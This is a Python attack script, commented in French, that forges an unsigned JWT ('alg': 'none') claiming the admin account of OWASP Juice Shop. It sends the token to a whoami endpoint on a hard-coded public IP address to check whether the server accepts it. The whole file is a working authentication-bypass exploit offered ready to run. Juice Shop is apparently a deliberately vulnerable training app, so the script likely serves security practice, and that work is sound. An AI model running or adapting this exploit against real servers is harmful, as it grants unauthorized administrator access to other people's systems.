import requests
import base64
import json
import logging
import time


class ForgedJWT:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    @staticmethod
    def base64url_encode(data):
        """Encode en Base64 URL-safe sans padding."""
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip("=")

    def forge_jwt(self):
        """Forge un JWT basé sur une analyse du token légitime."""
        # En-tête JWT
        header = {
            "typ": "JWT",
            "alg": "none"
        }
        encoded_header = self.base64url_encode(json.dumps(header).encode('utf-8'))

        # Payload JWT
        payload = {
            "status": "success",
            "data": {
                "id": 1,
                "username": "",
                "email": "admin@juice-sh.op",
                "password": "0192023a7bbd73250516f069df18b500",
                "role": "admin",
                "deluxeToken": "",
                "lastLoginIp": "178.132.107.235",
                "profileImage": "assets/public/images/uploads/defaultAdmin.png",
                "totpSecret": "",
                "isActive": True,
                "createdAt": "2025-01-17 07:10:54.569 +00:00",
                "updatedAt": "2025-01-17 11:19:21.537 +00:00",
                "deletedAt": None
            },
            "iat": int(time.time())
        }
        encoded_payload = self.base64url_encode(json.dumps(payload).encode('utf-8'))

        # Assemble the JWT without signature
        forged_jwt = f"{encoded_header}.{encoded_payload}."
        logging.info(f"JWT forgé: {forged_jwt}")
        return forged_jwt

    def test_forged_jwt(self, forged_jwt):
        """Test le JWT forgé pour valider son accès."""
        url = f"{self.base_url}/rest/user/whoami"
        headers = {
            "Authorization": f"Bearer {forged_jwt}",
            "Content-Type": "application/json"
        }

        response = self.session.get(url, headers=headers)
        if response.status_code == 200:
            logging.info(f"Succès sur {url}. Résultat : {response.json()}")
            return True
        else:
            logging.error(f"Échec sur {url}. Statut : {response.status_code}, Réponse : {response.text}")
            return False

    def execute(self):
        """Exécute l'attaque JWT."""
        logging.info("Démarrage de l'attaque Forged JWT...")
        forged_jwt = self.forge_jwt()

        if self.test_forged_jwt(forged_jwt):
            logging.info("JWT forgé validé avec succès.")
        else:
            logging.error("Le JWT forgé n'est pas accepté par le serveur.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    base_url = "http://45.76.47.218:3000"
    attack = ForgedJWT(base_url)
    attack.execute()
